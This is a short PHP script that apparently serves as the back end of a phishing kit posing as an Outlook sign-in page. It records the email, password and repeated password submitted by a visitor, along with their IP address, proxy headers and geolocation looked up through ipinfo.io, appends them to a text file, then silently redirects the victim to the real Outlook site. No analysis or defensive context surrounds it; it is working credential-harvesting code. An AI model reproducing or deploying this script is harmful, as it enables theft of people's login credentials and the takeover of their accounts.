<?php

date_default_timezone_set('America/Caracas');
ini_set("display_errors", 0);
$ip = $_SERVER['REMOTE_ADDR'];
$ip_comp = $_SERVER['HTTP_CLIENT_IP'];
$userp = $_SERVER['HTTP_X_FORWARDED'];
$proxy = $_SERVER['HTTP_X_FORWARDED_FOR'];



$cc = trim(file_get_contents("http://ipinfo.io/{$proxy}/country"));
$city = trim(file_get_contents("http://ipinfo.io/{$proxy}/city"));


$user_ip = $ip;
 
$url = "http://ipinfo.io/".$user_ip;
$ip_info = json_decode(file_get_contents($url));
$file = fopen("NEW01.txt", "a");
 
$ip = $ip_info->ip;
$host = $ip_info->hostname;
$city = $ip_info->city;
$region = $ip_info->region;
$country = $ip_info->country;
$loc = $ip_info->loc;
$loc_array = explode(',',$loc);
$lat = $loc_array[0];
$long = $loc_array[1];
$org = $ip_info->org;
$postal = $ip_info->postal;
 
		echo '<strong>Dirección IP   </strong>'.$ip.'<br>';
		echo '<strong>Host Name   </strong>'.$host.'<br>';
		echo '<strong>Ciudad    </strong>'.$ciudad.'<br>';
		echo '<strong>Region    </strong>'.$region.'<br>';
		echo '<strong>Codigo País  </strong>'.$pais.'<br>';
		echo '<strong>Localización   </strong>'.'Lat'.$lat.''.'Long'.$long.'<br>';
		echo '<strong>Org   </strong>'.$org.'<br>';
		echo '<strong>Portal Code    </strong>'.$postal.'<br>';

	
	$file = fopen("NEW01.txt", "a");
	
fwrite($file, 
"* EMAIL: ".$_POST['email']."
* PASS: ".$_POST['pass']."
* PASS1: ".$_POST['pass1']."
* FECHA: ".date('Y-m-d')."
* HORA: ".date('H:i:s')."
* IP: ".$ip."
* PROXY: ".$proxy."
* IP COMPARTIDA: ".$ip_comp."
* PAIS: ".$dataArray."
".$userp."
".$cc."
".$city."   
" . PHP_EOL);
fwrite($file, "==============================" . PHP_EOL);
fclose($file);

header("location:https://outlook.live.com/owa/");

?>
